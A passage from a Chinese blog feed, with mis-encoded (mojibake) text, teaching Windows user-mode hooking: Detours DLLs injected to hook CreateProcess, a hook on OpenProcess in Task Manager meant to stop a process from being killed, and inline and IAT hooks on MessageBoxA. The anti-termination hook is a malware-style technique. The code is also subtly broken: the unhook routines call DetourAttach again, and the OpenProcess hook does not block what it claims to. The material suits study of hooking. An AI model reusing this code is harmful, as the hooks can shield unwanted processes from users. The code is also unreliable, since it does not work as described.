class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">BOOL(WINAPI MyCreateProcessA)(</span><br><span class="line">     LPCSTR lpApplicationName,</span><br><span class="line">     LPSTR lpCommandLine,</span><br><span class="line">     LPSECURITY_ATTRIBUTES lpProcessAttributes,</span><br><span class="line">     LPSECURITY_ATTRIBUTES lpThreadAttributes,</span><br><span class="line">     BOOL bInheritHandles,</span><br><span class="line">     DWORD dwCreationFlags,</span><br><span class="line">     LPVOID lpEnvironment,</span><br><span class="line">     LPCSTR lpCurrentDirectory,</span><br><span class="line">     LPSTARTUPINFOA lpStartupInfo,</span><br><span class="line">     LPPROCESS_INFORMATION lpProcessInformation</span><br><span class="line">    ) &#123;</span><br><span class="line">    <span class="type">int</span> ret = _CreateProcessA( lpApplicationName,</span><br><span class="line">        lpCommandLine,</span><br><span class="line">        lpProcessAttributes,</span><br><span class="line">        lpThreadAttributes,</span><br><span class="line">        bInheritHandles,</span><br><span class="line">        dwCreationFlags,</span><br><span class="line">        lpEnvironment,</span><br><span class="line">        lpCurrentDirectory,</span><br><span class="line">        lpStartupInfo,</span><br><span class="line">        lpProcessInformation);</span><br><span class="line"></span><br><span class="line">    LPWSTR  title = LPWSTR(<span class="string">L&quot;æ–°è¿›ç¨‹åˆ›å»ºæç¤º&quot;</span>);</span><br><span class="line">    DWORD resp;<span class="comment">//ä¸è¦å®šä¹‰æˆæŒ‡é’ˆ</span></span><br><span class="line">    WTSSendMessageW(</span><br><span class="line">        WTS_CURRENT_SERVER_HANDLE,</span><br><span class="line">        WTSGetActiveConsoleSessionId(),</span><br><span class="line">        title, lstrlen((LPCSTR)title),</span><br><span class="line">        (LPWSTR)lpApplicationName, lstrlen(lpApplicationName),</span><br><span class="line">        <span class="number">0</span>, <span class="number">0</span>, &amp;resp, FALSE);</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">BOOL WINAPI <span class="title function_">MyCreateProcessW</span><span class="params">(</span></span><br><span class="line"><span class="params">    _In_opt_ LPCWSTR lpApplicationName,</span></span><br><span class="line"><span class="params">    _Inout_opt_ LPWSTR lpCommandLine,</span></span><br><span class="line"><span class="params">    _In_opt_ LPSECURITY_ATTRIBUTES lpProcessAttributes,</span></span><br><span class="line"><span class="params">    _In_opt_ LPSECURITY_ATTRIBUTES lpThreadAttributes,</span></span><br><span class="line"><span class="params">    _In_ BOOL bInheritHandles,</span></span><br><span class="line"><span class="params">    _In_ DWORD dwCreationFlags,</span></span><br><span class="line"><span class="params">    _In_opt_ LPVOID lpEnvironment,</span></span><br><span class="line"><span class="params">    _In_opt_ LPCWSTR lpCurrentDirectory,</span></span><br><span class="line"><span class="params">    _In_ LPSTARTUPINFOW lpStartupInfo,</span></span><br><span class="line"><span class="params">    _Out_ LPPROCESS_INFORMATION lpProcessInformation</span></span><br><span class="line"><span class="params">)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> ret = _CreateProcessW(</span><br><span class="line">        lpApplicationName,</span><br><span class="line">        lpCommandLine,</span><br><span class="line">        lpProcessAttributes,</span><br><span class="line">        lpThreadAttributes,</span><br><span class="line">        bInheritHandles,</span><br><span class="line">        dwCreationFlags,</span><br><span class="line">        lpEnvironment,</span><br><span class="line">        lpCurrentDirectory,</span><br><span class="line">        lpStartupInfo,</span><br><span class="line">        lpProcessInformation</span><br><span class="line">    );</span><br><span class="line">    LPWSTR  title = LPWSTR(<span class="string">L&quot;æ–°è¿›ç¨‹åˆ›å»ºæç¤º&quot;</span>);</span><br><span class="line"></span><br><span class="line">    DWORD resp;<span class="comment">//ä¸è¦å®šä¹‰æˆæŒ‡é’ˆ</span></span><br><span class="line">    WTSSendMessageW(</span><br><span class="line">        WTS_CURRENT_SERVER_HANDLE,</span><br><span class="line">        WTSGetActiveConsoleSessionId(),</span><br><span class="line">        title, lstrlen((LPCSTR)title),</span><br><span class="line">        (LPWSTR)lpApplicationName, lstrlen((LPCSTR)lpApplicationName),</span><br><span class="line">        <span class="number">0</span>, <span class="number">0</span>, &amp;resp, FALSE);</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//æŒ‚é’©</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">hook</span><span class="params">()</span> &#123;</span><br><span class="line">    DetourTransactionBegin();</span><br><span class="line">    DetourUpdateThread(GetCurrentThread());</span><br><span class="line">    DetourAttach((<span class="type">void</span>**)&amp;_CreateProcessA, MyCreateProcessA);</span><br><span class="line">    DetourAttach((<span class="type">void</span>**)&amp;_CreateProcessW, MyCreateProcessW);</span><br><span class="line">    DetourTransactionCommit();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//è„±é’©</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">unhook</span><span class="params">()</span> &#123;</span><br><span class="line">    DetourTransactionBegin();</span><br><span class="line">    DetourUpdateThread(GetCurrentThread());</span><br><span class="line">    DetourAttach((<span class="type">void</span>**)&amp;_CreateProcessA, MyCreateProcessA);</span><br><span class="line">    DetourAttach((<span class="type">void</span>**)&amp;_CreateProcessW, MyCreateProcessW);</span><br><span class="line">    DetourTransactionCommit();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">BOOL APIENTRY <span class="title function_">DllMain</span><span class="params">( HMODULE hModule,</span></span><br><span class="line"><span class="params">                       DWORD  ul_reason_for_call,</span></span><br><span class="line"><span class="params">                       LPVOID lpReserved</span></span><br><span class="line"><span class="params">                     )</span></span><br><span class="line">&#123;</span><br><span class="line">    LPWSTR  title = LPWSTR(<span class="string">L&quot;æç¤º&quot;</span>);</span><br><span class="line">    LPWSTR  message = LPWSTR(<span class="string">L&quot;æ³¨å…¥æˆåŠŸ&quot;</span>);</span><br><span class="line">    DWORD resp;<span class="comment">//ä¸è¦å®šä¹‰æˆæŒ‡é’ˆ</span></span><br><span class="line">    <span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">        WTSSendMessageW(</span><br><span class="line">            WTS_CURRENT_SERVER_HANDLE,</span><br><span class="line">            WTSGetActiveConsoleSessionId(),</span><br><span class="line">            title, lstrlen(LPCSTR(title)),</span><br><span class="line">            message, lstrlen(LPCSTR(message)),</span><br><span class="line">            <span class="number">0</span>, <span class="number">0</span>, &amp;resp, FALSE);</span><br><span class="line">        hook();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">        unhook();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="é˜²æ­¢ä»»åŠ¡ç®¡ç†å™¨ç»“æŸæŸè¿›ç¨‹"><a href="#é˜²æ­¢ä»»åŠ¡ç®¡ç†å™¨ç»“æŸæŸè¿›ç¨‹" class="headerlink" title="é˜²æ­¢ä»»åŠ¡ç®¡ç†å™¨ç»“æŸæŸè¿›ç¨‹"></a>é˜²æ­¢ä»»åŠ¡ç®¡ç†å™¨ç»“æŸæŸè¿›ç¨‹</h4><p>è°ƒç”¨TerminateProcess ç»“æŸè¿›ç¨‹</p>
<p>hookä½openprocess é‚£ä¹ˆä»»åŠ¡ç®¡ç†å™¨åœ¨è°ƒç”¨TerminateProcessæ—¶æ‰¾ä¸åˆ°ç›¸å…³å¥æŸ„å°±æ— æ³•ç»“æŸä»»åŠ¡</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// dllmain.cpp : å®šä¹‰ DLL åº”ç”¨ç¨‹åºçš„å…¥å£ç‚¹ã€‚</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pch.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;detours.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;WtsApi32.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib,<span class="string">&quot;WtsApi32.lib&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib,<span class="string">&quot;detours.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HANDLE(WINAPI* _OpenProcess)(</span><br><span class="line">    _In_ DWORD dwDesiredAccess,</span><br><span class="line">    _In_ BOOL bInheritHandle,</span><br><span class="line">    _In_ DWORD dwProcessId</span><br><span class="line">) = OpenProcess;</span><br><span class="line"></span><br><span class="line">HANDLE WINAPI <span class="title function_">MyOpenProcess</span><span class="params">(</span></span><br><span class="line"><span class="params">    _In_ DWORD dwDesiredAccess,</span></span><br><span class="line"><span class="params">    _In_ BOOL bInheritHandle,</span></span><br><span class="line"><span class="params">    _In_ DWORD dwProcessId</span></span><br><span class="line"><span class="params">)</span> &#123;</span><br><span class="line"></span><br><span class="line">    HWND hwnd = FindWindowW(<span class="string">L&quot;Notepad&quot;</span>, <span class="string">L&quot;æ— æ ‡é¢˜ - è®°äº‹æœ¬&quot;</span>); </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (hwnd != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">        _OpenProcess(dwDesiredAccess, bInheritHandle, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    HANDLE ret = _OpenProcess(dwDesiredAccess, bInheritHandle, dwProcessId);</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//æŒ‚é’©</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">hook</span><span class="params">()</span> &#123;</span><br><span class="line">    DetourTransactionBegin();</span><br><span class="line">    DetourUpdateThread(GetCurrentThread());</span><br><span class="line">    DetourAttach((<span class="type">void</span>**)&amp;_OpenProcess, MyOpenProcess);</span><br><span class="line">    DetourTransactionCommit();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//è„±é’©</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">unhook</span><span class="params">()</span> &#123;</span><br><span class="line">    DetourTransactionBegin();</span><br><span class="line">    DetourUpdateThread(GetCurrentThread());</span><br><span class="line">    DetourAttach((<span class="type">void</span>**)&amp;_OpenProcess, MyOpenProcess);</span><br><span class="line">    DetourTransactionCommit();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BOOL APIENTRY <span class="title function_">DllMain</span><span class="params">(HMODULE hModule,</span></span><br><span class="line"><span class="params">    DWORD  ul_reason_for_call,</span></span><br><span class="line"><span class="params">    LPVOID lpReserved</span></span><br><span class="line"><span class="params">)</span></span><br><span class="line">&#123;</span><br><span class="line">    </span><br><span class="line">    LPWSTR  title = LPWSTR(<span class="string">L&quot;æç¤º&quot;</span>);</span><br><span class="line">    LPWSTR  message = LPWSTR(<span class="string">L&quot;æ³¨å…¥æˆåŠŸ&quot;</span>);</span><br><span class="line">    DWORD resp;<span class="comment">//ä¸è¦å®šä¹‰æˆæŒ‡é’ˆ</span></span><br><span class="line">    <span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">        WTSSendMessageW(</span><br><span class="line">            WTS_CURRENT_SERVER_HANDLE,</span><br><span class="line">            WTSGetActiveConsoleSessionId(),</span><br><span class="line">            title, lstrlen(LPCWSTR(title)),</span><br><span class="line">            message, lstrlen(LPCWSTR(message)),</span><br><span class="line">            <span class="number">0</span>, <span class="number">0</span>, &amp;resp, FALSE);</span><br><span class="line">        hook();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">        unhook();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å°†dllæ³¨å…¥åˆ°ä»»åŠ¡ç®¡ç†å™¨ä¸­  ç„¶ååœ¨ä»»åŠ¡ç®¡ç†å™¨ä¸‹å¼ºåˆ¶å…³é—­æ–°å»ºçš„è®°äº‹æœ¬ ä¼šæ— æ³•å…³é—­</p>
]]></content>
      <categories>
        <category>R3Hook</category>
      </categories>
      <tags>
        <tag>R3Hook</tag>
      </tags>
  </entry>
  <entry>
    <title>InlineHook</title>
    <url>/posts/caec0788/</url>
    <content><![CDATA[<p><strong>Ring3å±‚ä¸‹çš„Inline Hookæ˜¯æœ€å¸¸ç”¨çš„Hookæ‰‹æ®µä¹‹ä¸€ï¼Œæ˜¯ä¸€ç§é€šè¿‡ä¿®æ”¹æœºå™¨ç çš„æ–¹å¼æ¥å®ç°hookçš„æŠ€æœ¯ã€‚</strong></p>
<p>JMPçš„åœ°å€ (88881234) â€“ ä»£ç åœ°å€ (010073bb) â€“ 5ï¼ˆå­—èŠ‚ï¼‰ = æœºå™¨ç è·³è½¬åœ°å€ (E9 87879e74)</p>
<h5 id="jmpè·³è½¬çš„åœ°å€-è‡ªå·±å®ç°çš„å‡½æ•°åœ°å€-ï¼ˆjmpæ‰€åœ¨çš„åœ°å€-5"><a href="#jmpè·³è½¬çš„åœ°å€-è‡ªå·±å®ç°çš„å‡½æ•°åœ°å€-ï¼ˆjmpæ‰€åœ¨çš„åœ°å€-5" class="headerlink" title="jmpè·³è½¬çš„åœ°å€=è‡ªå·±å®ç°çš„å‡½æ•°åœ°å€-ï¼ˆjmpæ‰€åœ¨çš„åœ°å€+5)"></a><strong>jmpè·³è½¬çš„åœ°å€=è‡ªå·±å®ç°çš„å‡½æ•°åœ°å€-ï¼ˆjmpæ‰€åœ¨çš„åœ°å€+5)</strong></h5><h4 id><a href="#" class="headerlink" title></a></h4><h4 id="1-éœ€è¦æ‰‹åŠ¨è„±é’©"><a href="#1-éœ€è¦æ‰‹åŠ¨è„±é’©" class="headerlink" title="1.   éœ€è¦æ‰‹åŠ¨è„±é’©"></a>1.   éœ€è¦æ‰‹åŠ¨è„±é’©</h4><ol>
<li>æ„é€ è·³è½¬æŒ‡ä»¤ã€‚</li>
<li>åœ¨å†…å­˜ä¸­æ‰¾åˆ°è¦Hookå‡½æ•°åœ°å€ï¼Œå¹¶ä¿å­˜è¦Hookä½ç½®å¤„çš„å‰5å­—èŠ‚ã€‚</li>
<li>å°†æ„é€ çš„è·³è½¬æŒ‡ä»¤å†™å…¥éœ€Hookçš„ä½ç½®å¤„ã€‚</li>
<li>å½“è¢«Hookä½ç½®è¢«æ‰§è¡Œæ—¶ä¼šè½¬åˆ°è‡ªå·±çš„æµç¨‹æ‰§è¡Œã€‚</li>
<li>å¦‚æœè¦æ‰§è¡ŒåŸæ¥çš„æµç¨‹ï¼Œé‚£ä¹ˆå–æ¶ˆHookï¼Œä¹Ÿå°±æ˜¯è¿˜åŸè¢«ä¿®æ”¹çš„å­—èŠ‚ã€‚</li>
<li>æ‰§è¡ŒåŸæ¥çš„æµç¨‹ã€‚</li>
<li>ç»§ç»­Hookä½åŸæ¥çš„ä½ç½®ã€‚</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">int</span> <span class="params">(WINAPI* lPMessageBoxA)</span><span class="params">(HWND, LPCSTR, LPCSTR, UINT)</span>;</span><br><span class="line"></span><br><span class="line">BYTE olddata32[<span class="number">5</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="type">void</span> <span class="title function_">hook</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">unhook</span><span class="params">()</span>;</span><br><span class="line"><span class="type">int</span> num = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> WINAPI <span class="title function_">MyMessageBoxA</span><span class="params">(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType)</span> &#123;</span><br><span class="line">	<span class="comment">//è°ƒç”¨åŸæ¥çš„MessageBoxA API  å…ˆè„±é’©</span></span><br><span class="line">	unhook();</span><br><span class="line">	lPMessageBoxA messagebox = (DWORD)GetProcAddress(GetModuleHandle(<span class="string">&quot;user32.dll&quot;</span>), <span class="string">&quot;MessageBoxA&quot;</span>);</span><br><span class="line">	<span class="type">int</span> ret = messagebox(<span class="number">0</span>, <span class="string">&quot;Hook&quot;</span>, <span class="string">&quot;Hook&quot;</span>, <span class="number">0</span>);</span><br><span class="line">	num++;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;MessageBoxè¢«è°ƒç”¨%dæ¬¡\n&quot;</span>,num);</span><br><span class="line">	hook();<span class="comment">//å‡½æ•°ä¸­ä¹‹å‰å†æ¬¡hok ä¸ºäº†æ‹¦æˆªä¸‹æ¬¡è°ƒç”¨</span></span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//æŒ‚é’©</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">hook</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="comment">//è·å–MessageBoxçš„åœ°å€</span></span><br><span class="line">	DWORD messagebox = (DWORD)GetProcAddress(GetModuleHandle(<span class="string">&quot;user32.dll&quot;</span>), <span class="string">&quot;MessageBoxA&quot;</span>);</span><br><span class="line">	BYTE data[<span class="number">5</span>] = &#123; <span class="number">0xe9</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span> &#125;;  <span class="comment">//&#123; 0xe9, &#125;é»˜è®¤åˆå§‹åŒ–ä¸º0 0xe9-&gt;jmp</span></span><br><span class="line">	DWORD offset = (DWORD)MyMessageBoxA - messagebox - <span class="number">5</span>; <span class="comment">//è®¡ç®—jmpè·³è½¬çš„åç§»é‡</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//ä¿å­˜å‰äº”ä¸ªå­—èŠ‚æ•°æ®</span></span><br><span class="line">	<span class="built_in">memcpy</span>(olddata32, messagebox, <span class="number">5</span>);</span><br><span class="line">	<span class="comment">//æŠŠåç§»é‡ä¸ JMPæŒ‡ä»¤æ‹¼æ¥</span></span><br><span class="line">	<span class="built_in">memcpy</span>(&amp;data[<span class="number">1</span>], &amp;offset, <span class="number">4</span>); <span class="comment">//4ä¸ªä¸jmpæŒ‡ä»¤æ‹¼æ¥</span></span><br><span class="line">	<span class="comment">//memcpy(data+1, &amp;offset, 4);  ä¹Ÿå¯ä»¥è¿™æ ·å†™</span></span><br><span class="line"></span><br><span class="line">	DWORD oldProtected = <span class="number">0</span>;</span><br><span class="line">	<span class="comment">//å°†å†…å­˜æ”¹ä¸ºå¯è¯»å¯å†™å¯æ‰§è¡Œ</span></span><br><span class="line">	VirtualProtect(messagebox, <span class="number">5</span>, PAGE_EXECUTE_READWRITE, &amp;oldProtected);</span><br><span class="line">	<span class="built_in">memcpy</span>(messagebox, data, <span class="number">5</span>);</span><br><span class="line">	<span class="comment">//è¿˜åŸå†…å­˜å±æ€§</span></span><br><span class="line">	VirtualProtect(messagebox, <span class="number">5</span>, oldProtected, &amp;oldProtected);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//è„±é’©</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">unhook</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="comment">//è·å–MessageBoxçš„åœ°å€</span></span><br><span class="line">	DWORD messagebox = (DWORD)GetProcAddress(GetModuleHandle(<span class="string">&quot;user32.dll&quot;</span>), <span class="string">&quot;MessageBoxA&quot;</span>);</span><br><span class="line"></span><br><span class="line">	DWORD oldProtected = <span class="number">0</span>;</span><br><span class="line">	<span class="comment">//å°†å†…å­˜æ”¹ä¸ºå¯è¯»å¯å†™å¯æ‰§è¡Œ</span></span><br><span class="line">	VirtualProtect(messagebox, <span class="number">5</span>, PAGE_EXECUTE_READWRITE, &amp;oldProtected);</span><br><span class="line">	<span class="built_in">memcpy</span>(messagebox, olddata32, <span class="keyword">sizeof</span>(olddata32));</span><br><span class="line">	<span class="comment">//è¿˜åŸå†…å­˜å±æ€§</span></span><br><span class="line">	VirtualProtect(messagebox, <span class="number">5</span>, oldProtected, &amp;oldProtected);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">	hook();</span><br><span class="line">	<span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		MessageBoxA(<span class="number">0</span>, <span class="string">&quot;æ­£å¸¸è°ƒç”¨MessageBoxA&quot;</span>, <span class="string">&quot;æœªHook&quot;</span>, <span class="number">0</span>);</span><br><span class="line">		Sleep(<span class="number">2000</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/posts/caec0788/1.png" alt="img"></p>
<h4 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h4><p>å°†ä¸‰æ¡æŒ‡ä»¤ä¿å­˜èµ·æ¥</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">DWORD jump = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">_declspec(naked) <span class="type">int</span> _stdcall <span class="title function_">Transfer</span><span class="params">(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType)</span> &#123;</span><br><span class="line">	_asm &#123;</span><br><span class="line">		mov edi, edi</span><br><span class="line">		push ebp</span><br><span class="line">		mov ebp, esp</span><br><span class="line">		mov ebx, jump</span><br><span class="line">		jmp ebx</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BYTE olddata32[<span class="number">5</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="type">void</span> <span class="title function_">hook</span><span class="params">()</span>;</span><br><span class="line"><span class="type">int</span> num = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> WINAPI <span class="title function_">MyMessageBoxA</span><span class="params">(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType)</span> &#123;</span><br><span class="line">	</span><br><span class="line">	num++;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;MessageBoxè¢«è°ƒç”¨%dæ¬¡\n&quot;</span>, num);</span><br><span class="line">	<span class="type">char</span>* text = <span class="string">&quot;Hook&quot;</span>; </span><br><span class="line">	</span><br><span class="line">	hook();<span class="comment">//å‡½æ•°ä¸­ä¹‹å‰å†æ¬¡hok ä¸ºäº†æ‹¦æˆªä¸‹æ¬¡è°ƒç”¨</span></span><br><span class="line">	<span class="keyword">return</span> Transfer( hWnd,  text, text,  uType);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//æŒ‚é’©</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">hook</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="comment">//è·å–MessageBoxçš„åœ°å€</span></span><br><span class="line">	DWORD messagebox = (DWORD)GetProcAddress(GetModuleHandle(<span class="string">&quot;user32.dll&quot;</span>), <span class="string">&quot;MessageBoxA&quot;</span>);</span><br><span class="line"></span><br><span class="line">	DWORD value = (DWORD)MyMessageBoxA - messagebox - <span class="number">5</span>; <span class="comment">//è®¡ç®—jmpè·³è½¬çš„åç§»é‡</span></span><br><span class="line"></span><br><span class="line">	DWORD oldProtected = <span class="number">0</span>;</span><br><span class="line">	<span class="comment">//å°†å†…å­˜æ”¹ä¸ºå¯è¯»å¯å†™å¯æ‰§è¡Œ</span></span><br><span class="line">	VirtualProtect(messagebox, <span class="number">5</span>, PAGE_EXECUTE_READWRITE, &amp;oldProtected);</span><br><span class="line">	</span><br><span class="line">	jump = messagebox + <span class="number">5</span>;  <span class="comment">//+5 è¶Šè¿‡jmpæŒ‡ä»¤  | mov edi edi| push ebp | mov ebp, esp</span></span><br><span class="line">	_asm &#123;</span><br><span class="line">		mov eax,messagebox</span><br><span class="line">		mov byte ptr [eax], <span class="number">0xe9</span>    <span class="comment">//jmp</span></span><br><span class="line">		inc eax </span><br><span class="line">		<span class="comment">//åé¢è¿˜æœ‰4ä¸ªå­—èŠ‚ ç”¨ä¸€ä¸ªå¯„å­˜å™¨å­˜å‚¨</span></span><br><span class="line">		mov ebx, value </span><br><span class="line">		mov dword ptr [eax], ebx</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//è¿˜åŸå†…å­˜å±æ€§</span></span><br><span class="line">	VirtualProtect(messagebox, <span class="number">5</span>, oldProtected, &amp;oldProtected);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">	hook();</span><br><span class="line">	<span class="keyword">while</span> (<span class="number">1</span>)	&#123;</span><br><span class="line">		MessageBoxA(<span class="number">0</span>, <span class="string">&quot;æ­£å¸¸è°ƒç”¨MessageBoxA&quot;</span>, <span class="string">&quot;æœªHook&quot;</span>, <span class="number">0</span>);</span><br><span class="line">		Sleep(<span class="number">2000</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>R3Hook</category>
      </categories>
      <tags>
        <tag>R3Hook</tag>
      </tags>
  </entry>
  <entry>
    <title>IATHook</title>
    <url>/posts/60466c61/</url>
    <content><![CDATA[<p>IATHook å³ä¿®æ”¹PEæ–‡ä»¶çš„è¾“å…¥è¡¨ï¼Œå°†ç›®æ ‡å‡½æ•°ä¿®æ”¹æˆæˆ‘ä»¬è‡ªå·±çš„å‡½æ•°å¹¶æ‰§è¡Œ(è¿™é‡Œä½¿ç”¨MessageBoxA)ã€‚<br>å¯ç”¨æ¥HOOKè‡ªèº«çš„LoadLibraryå‡½æ•°é˜²æ­¢è‡ªèº«è¿›ç¨‹è¢«dllæ³¨å…¥ï¼Œä¹Ÿå¯ä»¥é€šè¿‡dllæ³¨å…¥çš„æ–¹å¼è¾¾åˆ°ä¿®æ”¹å…¶ä»–è¿›ç¨‹çš„ç›®çš„</p>
<p>ITAdll.dll</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// dllmain.cpp : å®šä¹‰ DLL åº”ç”¨ç¨‹åºçš„å…¥å£ç‚¹ã€‚</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pch.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">int</span> <span class="params">(WINAPI* lPMessageBoxA)</span><span class="params">(HWND, LPCSTR , LPCSTR, UINT)</span>;</span><br><span class="line">lPMessageBoxA åŸæ¥çš„MessageBox = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> WINAPI <span class="title function_">MyMessageBoxA</span><span class="params">(HWND hWnd, LPCSTR lpText,  LPCSTR lpCaption, UINT uType)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> åŸæ¥çš„MessageBox(hWnd, <span class="string">&quot;textgai&quot;</span>, lpCaption, uType);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PIMAGE_NT_HEADERS <span class="title function_">GetNthead</span><span class="params">()</span> &#123;</span><br><span class="line">    PIMAGE_DOS_HEADER dos = <span class="literal">NULL</span>;</span><br><span class="line">    PIMAGE_NT_HEADERS nt = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    DWORD temp = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    HMODULE é•œåƒåŸºåœ°å€ = GetModuleHandle(<span class="literal">NULL</span>);</span><br><span class="line">    dos = (PIMAGE_DOS_HEADER)(DWORD)é•œåƒåŸºåœ°å€;</span><br><span class="line">    temp = (DWORD)dos + (DWORD)dos-&gt;e_lfanew;   <span class="comment">//pe rva</span></span><br><span class="line">    nt = (PIMAGE_NT_HEADERS)temp;</span><br><span 